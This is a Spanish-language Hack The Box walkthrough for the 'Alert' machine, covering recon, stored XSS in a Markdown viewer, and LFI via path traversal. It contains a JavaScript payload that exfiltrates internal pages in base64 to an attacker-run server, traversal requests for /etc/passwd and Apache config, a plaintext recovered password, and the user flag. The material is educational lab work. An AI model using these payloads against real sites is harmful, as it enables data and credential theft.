# Máquina Alert (HTB)

- **IP:** 10.129.231.188
- **SO:** Linux (Ubuntu / Apache 2.4.41)
- **Resumen de la cadena:** XSS almacenado en un visor de Markdown → leer páginas internas vía JS → LFI (`messages.php?file=`) → leer config de Apache y descubrir vhost `statistics.alert.htb` → credenciales de `albert` → SSH → (flag de usuario). La escalada a root queda pendiente ("es una fumadilla").
- **Estado:** Usuario conseguido. Root PENDIENTE.

---

## 1. Reconocimiento

**[en Kali] Escaneo de todos los puertos:**
```bash
sudo nmap -p- --min-rate 5000 10.129.231.188
```
> [captura: nmap muestra 22/tcp ssh, 80/tcp http, 12227/tcp filtered]

**[en Kali] Escaneo detallado de los puertos abiertos:**
```bash
sudo nmap -p22,80 -sVC 10.129.231.188 -oN targeted
```
> [captura: OpenSSH 8.2p1, Apache httpd 2.4.41, http-title "Alert - Markdown Viewer", requested resource = index.php?page=alert]

**[en Kali] Añadir el dominio al /etc/hosts:**
```bash
sudo nano /etc/hosts
# 10.129.231.188  alert.htb
```

## 2. Enumeración web

**[en Kali] Fuzzing de subdominios/vhosts con ffuf** (filtrando el código 301 de las respuestas no válidas):
```bash
ffuf -u http://alert.htb -H "Host: FUZZ.alert.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301
```
> [captura: ffuf encuentra el vhost "statistics"]
- Añadir `statistics.alert.htb` al `/etc/hosts`.

**[en Kali] Fuzzing de directorios (ruta alternativa):**
```bash
gobuster dir -u http://alert.htb \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php
```

**Notas del sitio:** es un visor de Markdown (`visualizer.php`). Al subir un `.md` lo renderiza a HTML y genera un enlace para compartir del tipo:
```
http://alert.htb/visualizer.php?link_share=<hash>.md
```

## 3. Explotación — XSS almacenado → LFI

**Idea:** el `.md` se renderiza sin sanitizar, así que se inyecta JavaScript. Al enviar el enlace al admin (vía "Contact us"), el script se ejecuta en su sesión.

**[en la web / payload .md] Prueba de XSS:**
```html
<script>
 alert(0);
</script>
```
> [captura: popup "0" en alert.htb — confirma la ejecución de JS]

**[en Kali] Levantar servidor para recibir exfiltración:**
```bash
python3 -m http.server 80
ip a   # anotar la IP de tun0 → 10.10.14.51
```

**[en Kali] Crear `pwn.js`** que lee una página interna y la exfiltra en base64 a nuestro servidor:
```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/index.php?page=messages', false);
req.send();

var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://10.10.14.51/?b64=' + btoa(req.responseText), false);
exfil.send();
```

**[en la web — Contact us] Enviar al admin un correo** apuntando al `pwn.js` alojado en nuestro servidor (con la dirección del `.md`/enlace compartido). El admin lo abre y nos llegan las peticiones.
> [captura: "Message sent successfully!" + peticiones entrantes en el servidor python]

**Pivotar a LFI:** se cambia el `req.open` para abusar del parámetro vulnerable `messages.php?file=` con path traversal:
```javascript
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../etc/passwd', false);
```
> [captura: contenido de /etc/passwd devuelto en base64]

**[en Kali] Decodificar y filtrar usuarios con shell:**
```bash
echo '<base64>' | base64 -d | grep "sh$"
```
> [captura: root, albert y david tienen /bin/bash]

**Leer la config de Apache** para localizar el vhost de statistics:
```javascript
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/sites-available/000-default.conf', false);
```
- Lleva a `http://statistics.alert.htb/` con usuario **albert**.

**Leer el .htpasswd / credenciales de statistics** → contraseña de albert:
```
usuario:  albert
password: manchesterunited
```

## 4. Acceso (user)

**[en Kali] Conexión SSH:**
```bash
ssh albert@10.129.231.188   # pass: manchesterunited
```

**[en la víctima] Flag de usuario:**
```bash
cat user.txt
# a24707ae622cd2385700edbc40b1cfbb
```

## 5. Escalada de privilegios (PENDIENTE)

Nota propia del documento: "Para sacar la otra es una fumadilla". Se identificó un túnel/port-forward interno:
```bash
# [en Kali] forwarding del servicio local 8080 interno
ssh albert@10.129.39.219 -L 8080:127.0.0.1:8080
```
> Pista: hay un servicio web interno (`website-monitor` / config) escuchando en 127.0.0.1 que probablemente sea la vía de escalada a root. **Pendiente de completar.**

---

### Flags
| Flag | Valor |
|------|-------|
| user.txt | `a24707ae622cd2385700edbc40b1cfbb` |
| root.txt | *pendiente* |
